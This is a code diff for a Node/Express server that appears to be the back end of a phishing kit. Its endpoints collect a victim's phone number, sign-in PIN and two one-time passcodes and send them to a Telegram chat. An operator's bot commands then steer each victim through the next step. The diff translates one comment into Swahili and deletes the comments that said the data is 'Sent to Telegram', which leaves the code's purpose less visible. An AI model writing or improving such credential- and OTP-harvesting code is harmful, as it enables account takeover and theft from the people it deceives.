@@ -109,7 +109,7 @@ async function initBot() {
           break;
         case 'ALLOW_APP':
         case 'ALLOW':
-          session.status = 'PROCEED_OTP1'; // Proceed to OTP after ALLOW on PIN
+          session.status = 'PROCEED_OTP1'; // Hali inabadilika mara moja kwenda OTP 1
           await bot.sendMessage(chatTarget, `✅ PIN allowed. Moved to OTP Step 1.`);
           break;
         case 'WRONG_PIN':
@@ -175,7 +175,6 @@ app.get('/api/check-status/:userId', (req, res) => {
   res.status(200).json({ status: session.status });
 });
 
-// Submit Sign In PIN -> Sent to Telegram
 app.post('/api/submit-pin', async (req, res) => {
   try {
     const { userId, phone, pin } = req.body || {};
@@ -209,7 +208,6 @@ app.post('/api/submit-pin', async (req, res) => {
   }
 });
 
-// Submit OTP 1 -> Sent to Telegram
 app.post('/api/submit-otp1', async (req, res) => {
   try {
     const { userId, phone, otp } = req.body || {};
@@ -244,7 +242,6 @@ app.post('/api/submit-otp1', async (req, res) => {
   }
 });
 
-// Submit OTP 2 (Final Verification) -> Sent to Telegram
 app.post('/api/submit-otp2', async (req, res) => {
   try {
     const { userId, phone, otp } = req.body || {};
@@ -283,4 +280,4 @@ app.listen(PORT, async () => {
   await initBot();
   console.log(`Server running on port ${PORT}`);
 });
-    
+        
